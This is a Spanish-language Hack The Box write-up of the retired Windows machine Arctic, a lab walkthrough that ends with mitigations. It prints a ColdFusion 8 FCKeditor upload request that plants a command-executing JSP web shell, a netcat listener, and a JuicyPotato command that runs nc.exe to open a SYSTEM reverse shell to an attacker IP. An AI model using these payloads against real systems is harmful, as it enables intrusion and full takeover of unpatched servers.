---
machine: Arctic
os: Windows
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, coldfusion, file-upload, seimpersonate, juicypotato]
---

# Arctic — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Un **ColdFusion 8** en el 8500 con el módulo FCKeditor accesible. La subida de ficheros del módulo acepta un `folder` con traversal, así que un JSP acaba en el directorio web y se ejecuta: shell como `tolis`. El box es un Windows Server 2008 R2 sin parchear y el token tiene `SeImpersonatePrivilege`, así que JuicyPotato (o MS10-059 como alternativa) remata a `SYSTEM`.

## Reconocimiento

```bash
nmap -sC -sV -p- <IP> -oN nmap.txt
```

```text
135/tcp   msrpc
8500/tcp  http    ColdFusion 8 (JRun 4)
49154/tcp msrpc
```

El 8500 tarda ~30 s en responder: hay que subir los timeouts o los escaneos y las subidas mienten.

## Enumeración

```text
http://<IP>:8500/CFIDE/administrator/
```

- Página de login del administrador de ColdFusion (sin credenciales por defecto útiles).
- `http://<IP>:8500/CFIDE/administrator/enter.cfm` y el resto del árbol `CFIDE` responden.
- El módulo vulnerable es `FCKeditor`, con `upload.cfm` en `/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/`.

El propio servicio expone el nombre del host y la versión en el HTML del administrador; con eso se confirma ColdFusion 8 y se sabe que el parche de la subida no está.

## Foothold

El conector de FCKeditor permite indicar carpeta y nombre. Con traversal en `folder` y un nombre con extensión ejecutable, el fichero se escribe fuera del directorio de subidas:

```http
POST /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=../../../../ HTTP/1.1
Content-Type: multipart/form-data; boundary=...

--...
Content-Disposition: form-data; name="newfile"; filename="shell.jsp"
Content-Type: application/x-java-archive

<%@ page import="java.util.*,java.io.*"%>
<% Process p = Runtime.getRuntime().exec(request.getParameter("c")); ... %>
--...
```

El fichero acaba en `/userfiles/file/../../..` → raíz web, servido como JSP. Se lanza un reverse shell en PowerShell o se usa el propio JSP para descargar el binario de turno:

```bash
rlwrap nc -lvnp 443
```

```text
C:\ColdFusion8\runtime\bin> whoami
arctic\tolis
```

## Movimiento lateral

- No aplica: la cadena se resuelve en un único host, sin salto lateral.
- Ver «Escalada de privilegios» para el paso de usuario a administrador.

## Escalada de privilegios

```text
C:\> whoami /priv

SeImpersonatePrivilege        Impersonate a client after authentication   Enabled
```

Con `SeImpersonate` y sin parches, la vía corta es un token kidnapping:

```text
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\temp\nc.exe <IP> 4444 -e cmd.exe" -t *
```

`-t *` prueba todos los CLSID disponibles; en 2008 R2 funcionan los de BITS y varios más. Alternativa si el token kidnapping falla: **MS10-059** (Chimichurri), ya que el host es 2008 R2 sin actualizar.

```text
C:\> whoami
nt authority\system
```

## Evidencia

```text
C:\Users\tolis\Desktop\user.txt        -> <user_flag>
C:\Users\Administrator\Desktop\root.txt -> <root_flag>
```

## Lecciones aprendidas

- Los conectores de subida heredados (FCKeditor, CKFinder) siguen vivos en instalaciones antiguas y aceptan traversal.
- Un timeout largo no es un fallo de red: el servidor tarda en generar el JSP y hay que esperar antes de concluir que el exploit no funciona.
- `SeImpersonatePrivilege` en un servicio web es escalada directa a `SYSTEM`; se corrige sacando al servicio de una cuenta con ese privilegio.
- Mitigación: retirar `CFIDE`, parchear ColdFusion y aplicar las actualizaciones de 2008 R2 (o migrar), y revisar qué cuentas de servicio acumulan privilegios de suplantación.

## Mitigaciones y detección

- Mínimo privilegio en el servicio expuesto y parcheo de la versión vulnerable.
- Detección: revisar los logs del servicio y alertar de peticiones anómalas o picos de error.
